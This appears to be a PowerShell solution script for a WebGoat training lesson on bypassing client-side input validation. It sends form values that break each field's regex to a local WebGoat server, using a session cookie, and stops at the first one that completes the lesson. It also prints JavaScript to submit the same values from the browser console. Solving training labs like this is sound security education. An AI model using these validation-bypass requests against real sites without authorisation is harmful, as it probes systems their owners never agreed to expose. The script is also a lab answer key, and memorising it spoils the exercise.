# ============================================================
# Input Validation Bypass Attack
# ============================================================
# Send values that VIOLATE the regex patterns
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Input Validation Bypass Attack" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Different payload sets to try (all violate the patterns)
$payloadSets = @(
    @{
        name = "Payload 1: Type violations"
        field1 = "ABC"              # Should be lowercase
        field2 = "abc"              # Should be digits
        field3 = "test!"            # Should not have special chars
        field4 = "ten"              # Not in enumeration
        field5 = "1234"             # Should be 5 digits
        field6 = "123456789"        # Wrong format
        field7 = "101-234-5678"     # Should start with 2-9
    },
    @{
        name = "Payload 2: Length violations"
        field1 = "abcd"             # Too long (should be 3)
        field2 = "1234"             # Too long (should be 3)
        field3 = "test@#$"          # Special chars
        field4 = "zero"             # Not in list
        field5 = "123456"           # Too long (should be 5)
        field6 = "1234"             # Too short
        field7 = "abc-def-ghij"     # All letters
    },
    @{
        name = "Payload 3: Mixed violations"
        field1 = "123"              # Numbers instead of letters
        field2 = "12"               # Too short
        field3 = "abc!"             # Special char
        field4 = "10"               # Number instead of word
        field5 = "abcde"            # Letters instead of digits
        field6 = "abc-1234"         # Letters in zip
        field7 = "123-456-789"      # Wrong format
    },
    @{
        name = "Payload 4: Case violations"
        field1 = "ABC"              # Uppercase
        field2 = "1a2"              # Mixed
        field3 = "#hash"            # Hash symbol
        field4 = "SEVEN"            # Wrong case
        field5 = "12-34"            # Dash in zip
        field6 = "90210-111"        # Wrong dash-4 format
        field7 = "1234567890"       # No dashes, wrong length
    },
    @{
        name = "Payload 5: Special chars"
        field1 = "a!b"              # Special char
        field2 = "@#$"              # All special
        field3 = "test$%^"          # Special chars
        field4 = "eleven"           # Not in list
        field5 = "12 34"            # Space
        field6 = "12345-12345"      # Wrong format
        field7 = "000-000-0000"     # Starts with 0
    }
)

foreach ($payload in $payloadSets) {
    Write-Host "=====================================" -ForegroundColor Yellow
    Write-Host "[Testing] $($payload.name)" -ForegroundColor Yellow
    Write-Host ""
    
    Write-Host "Payload values (all VIOLATE patterns):" -ForegroundColor Cyan
    Write-Host "  field1: $($payload.field1) (pattern: ^[a-z]{3}$)" -ForegroundColor White
    Write-Host "  field2: $($payload.field2) (pattern: ^[0-9]{3}$)" -ForegroundColor White
    Write-Host "  field3: $($payload.field3) (pattern: ^[a-zA-Z0-9 ]*$)" -ForegroundColor White
    Write-Host "  field4: $($payload.field4) (pattern: ^(one|two|...|nine)$)" -ForegroundColor White
    Write-Host "  field5: $($payload.field5) (pattern: ^\d{5}$)" -ForegroundColor White
    Write-Host "  field6: $($payload.field6) (pattern: ^\d{5}(-\d{4})?$)" -ForegroundColor White
    Write-Host "  field7: $($payload.field7) (pattern: ^[2-9]\d{2}-?\d{3}-?\d{4}$)" -ForegroundColor White
    Write-Host ""
    
    # Build form data
    $formData = @(
        "field1=$([System.Web.HttpUtility]::UrlEncode($payload.field1))",
        "field2=$([System.Web.HttpUtility]::UrlEncode($payload.field2))",
        "field3=$([System.Web.HttpUtility]::UrlEncode($payload.field3))",
        "field4=$([System.Web.HttpUtility]::UrlEncode($payload.field4))",
        "field5=$([System.Web.HttpUtility]::UrlEncode($payload.field5))",
        "field6=$([System.Web.HttpUtility]::UrlEncode($payload.field6))",
        "field7=$([System.Web.HttpUtility]::UrlEncode($payload.field7))"
    ) -join "&"
    
    try {
        $response = Invoke-WebRequest `
            -Uri "$webGoatUrl/WebGoat/BypassRestrictions/BypassValidation" `
            -Method POST `
            -Headers $headers `
            -Body $formData `
            -UseBasicParsing
        
        $result = $response.Content | ConvertFrom-Json
        
        Write-Host "Response:" -ForegroundColor Green
        Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
        Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
        Write-Host ""
        
        if ($result.output) {
            Write-Host "Output:" -ForegroundColor Cyan
            Write-Host "  $($result.output)" -ForegroundColor White
            Write-Host ""
        }
        
        if ($result.lessonCompleted -eq $true) {
            Write-Host "================================================" -ForegroundColor Green
            Write-Host "SUCCESS!" -ForegroundColor Green
            Write-Host "================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "Winning payload:" -ForegroundColor White
            Write-Host "  field1 = $($payload.field1)" -ForegroundColor Cyan
            Write-Host "  field2 = $($payload.field2)" -ForegroundColor Cyan
            Write-Host "  field3 = $($payload.field3)" -ForegroundColor Cyan
            Write-Host "  field4 = $($payload.field4)" -ForegroundColor Cyan
            Write-Host "  field5 = $($payload.field5)" -ForegroundColor Cyan
            Write-Host "  field6 = $($payload.field6)" -ForegroundColor Cyan
            Write-Host "  field7 = $($payload.field7)" -ForegroundColor Cyan
            Write-Host ""
            exit 0
        }
        
    } catch {
        Write-Host "[ERROR] Request failed: $_" -ForegroundColor Red
        if ($_.Exception.Response) {
            Write-Host "Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
        }
        Write-Host ""
    }
    
    Start-Sleep -Milliseconds 500
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Browser Console Alternative" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "If PowerShell didn't work, try browser console (F12):" -ForegroundColor White
Write-Host ""
Write-Host "// Copy this into browser console:" -ForegroundColor Yellow
Write-Host ""
Write-Host "document.querySelector('input[name=`"field1`"]').value = 'ABC';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"field2`"]').value = 'abc';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"field3`"]').value = 'test!';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"field4`"]').value = 'ten';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"field5`"]').value = '1234';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"field6`"]').value = '123456789';" -ForegroundColor Cyan
Write-Host "document.querySelector('input[name=`"field7`"]').value = '101-234-5678';" -ForegroundColor Cyan
Write-Host "document.querySelector('form').submit();" -ForegroundColor Cyan
Write-Host ""
